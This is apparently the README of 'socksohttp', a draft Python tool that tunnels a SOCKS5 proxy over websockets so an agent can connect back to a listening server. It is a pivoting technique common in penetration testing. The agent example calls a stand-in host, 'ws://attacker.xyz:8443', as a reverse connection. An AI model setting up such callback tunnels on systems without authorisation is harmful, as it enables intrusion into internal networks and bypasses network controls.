# socksohttp
Socks5 server over Websockets

# IMPORTANT
Project is draft, not fully tested.  
Do NOT I REPEAT: DO NOT use the master branch as it is most likely will not work! I'll set up a semi-stable version soon in a separate branch

# Prerequirements
Python>=3.6  
websockets  

# What does it do?
The same script has two modes of operation: ```server``` and ```agent```  
  
```server``` will set up a websocket listener. One or more ```agent``` will be connecting back to it.  
When an ```agent``` connects the ```server``` will open a TCP port on localhost (one per ```agent```).  
This TCP port will act like if it would be a Socks5 server, but the actual Socks5 server will be running on the ```agent```, the ```server``` only relays the incoming/outgoing traffic to and from the remote Socks 5 server.


# Help
The script can be run in two modes: ```server``` and ```agent```

## ```server``` mode params  
Command format: ```socksOhttp.py <verbosity> <mode> <listen_ip> <listen_port>```  
Example command: ```socksOhttp.py -vv server 0.0.0.0 8443```  
  
  
```-v``` is setting the verbosity, be careful as the more verbose you set the slower the connection will be, as it will write ALL incoming and outgoing traffic in hex to stdout!  
```server``` is to run the script as a server  
```0.0.0.0``` will make the server listen on all interfaces for incoming websocket agents  
```8443``` is the port the server will listen for incoming websocket agents  

## ```agent``` mode params  
Command format: ```socksOhttp.py <verbosity> <mode>  <server_url> <-p proxy_url>```  
Example command: ```socksOhttp.py -vv agent ws://attacker.xyz:8443 -p http://127.0.0.1:8080``` 

```-v``` is setting the verbosity, be careful as the more verbose you set the slower the connection will be, as it will write ALL incoming and outgoing traffic in hex to stdout!  
```agent``` is to run the script as an agent  
```ws://attacker.xyz:8443``` is the url of the server the agent should connect back to. Ovbiously replace ```attacker.xyz:8443``` to your server's address.  
```-p http://127.0.0.1:8080``` optional parameter, set it if you need to go trough a HTTP proxy  
